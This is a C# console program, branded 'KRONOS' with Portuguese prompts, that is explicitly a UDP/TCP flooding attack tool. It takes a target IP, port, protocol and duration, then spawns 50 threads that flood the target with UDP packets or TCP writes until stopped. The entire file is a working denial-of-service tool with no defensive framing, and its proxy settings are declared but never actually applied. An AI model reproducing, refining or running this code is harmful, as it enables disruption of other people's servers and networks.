using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class UdpTcpFlooder
{
    static bool isRunning = true;

    static void Main(string[] args)
    {

        string asciiArt = @"
  K   K   RRRR    OOO   N   N   OOO   SSS  
  K  K    R   R  O   O  NN  N  O   O  S    
  KKK     RRRR   O   O  N N N  O   O   SSS  
  K  K    R  R   O   O  N  NN  O   O      S  
  K   K   R   R   OOO   N   N   OOO   SSS  
";



        Console.BackgroundColor = ConsoleColor.Black;
        Console.Clear();

        Random colorRandomizer = new Random();


        for (int i = 0; i < 10; i++)
        {
            Console.ForegroundColor = (ConsoleColor)colorRandomizer.Next(1, 16); 
            Console.Clear();
            Console.WriteLine(asciiArt);
            Thread.Sleep(300); 
        }

 
        AnimatedText("===== UDP/TCP Attack =====", ConsoleColor.Cyan, 100);
        AnimatedText("Ferramenta de ataque UDP/TCP", ConsoleColor.Green, 100);

        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.Write("Digite o IP: ");
        string ip = Console.ReadLine();

        Console.Write("Digite a porta: ");
        int port = int.Parse(Console.ReadLine());

        Console.Write("Tipo de ataque (UDP/TCP): ");
        string attackType = Console.ReadLine().ToUpper();

        Console.Write("Duração do ataque (em segundos): ");
        int duration = int.Parse(Console.ReadLine());

        string proxyAddress = ""; //configure sua proxy
        int proxyPort = 0; //configure sua proxy
        string proxyUser = ""; //configure sua proxy
        string proxyPass = ""; //configure sua proxy

        int packetsPerConnection = 10000;
        int threadsCount = 50; 

        AnimatedText("\nIniciando ataque...", ConsoleColor.Magenta, 100);
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine($"IP: {ip}, Porta: {port}, Tipo: {attackType}, Duração: {duration}s\n");

        for (int i = 0; i < threadsCount; i++)
        {
            Thread thread = new Thread(() =>
            {
                if (attackType == "UDP")
                    UdpAttack(ip, port, packetsPerConnection);
                else if (attackType == "TCP")
                    TcpAttack(ip, port, packetsPerConnection, proxyAddress, proxyPort, proxyUser, proxyPass);
            });
            thread.Start();
        }

        // Cronometrando o ataque
        Thread timerThread = new Thread(() =>
        {
            Thread.Sleep(duration * 1000);
            isRunning = false;
        });
        timerThread.Start();

        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("Pressione ENTER para parar o ataque manualmente.");
        Console.ReadLine();
        isRunning = false;

        Console.ForegroundColor = ConsoleColor.Red;
        AnimatedText("Crash de partida Parado.", ConsoleColor.Red, 100);
    }

    static void UdpAttack(string ip, int port, int packetsPerConnection)
    {
        Random random = new Random();
        byte[] data = new byte[1024];
        random.NextBytes(data);

        while (isRunning)
        {
            try
            {
                using (UdpClient udpClient = new UdpClient())
                {
                    udpClient.Client.Bind(new IPEndPoint(IPAddress.Any, 0));
                    udpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 3000);
                    udpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.SendTimeout, 3000);

                    for (int i = 0; i < packetsPerConnection; i++)
                    {
                        udpClient.Send(data, data.Length, ip, port);
                    }
                }
                AnimatedText("[UDP] Pacotes enviados!", ConsoleColor.Green, 100);
            }
            catch (Exception ex)
            {
                AnimatedText($"Erro UDP: {ex.Message}", ConsoleColor.Red, 100);
            }
        }
    }

    static void TcpAttack(string ip, int port, int packetsPerConnection, string proxyAddress, int proxyPort, string proxyUser, string proxyPass)
    {
        Random random = new Random();
        byte[] data = Encoding.ASCII.GetBytes("Flood attack data");

        WebProxy proxy = new WebProxy(proxyAddress, proxyPort)
        {
            Credentials = new NetworkCredential(proxyUser, proxyPass)
        };

        while (isRunning)
        {
            try
            {
                TcpClient tcpClient = new TcpClient(ip, port);
                using (NetworkStream stream = tcpClient.GetStream())
                {
                    for (int i = 0; i < packetsPerConnection; i++)
                    {
                        stream.Write(data, 0, data.Length);
                    }
                }
                AnimatedText("[TCP] Pacotes enviados!", ConsoleColor.Green, 100);
            }
            catch (Exception ex)
            {
                AnimatedText($"Erro TCP: {ex.Message}", ConsoleColor.Red, 100);
            }
        }
    }

    static void AnimatedText(string text, ConsoleColor color, int delay)
    {
        Console.ForegroundColor = color;
        foreach (char c in text)
        {
            Console.Write(c);
            Thread.Sleep(delay); 
        }
        Console.WriteLine();
    }
}
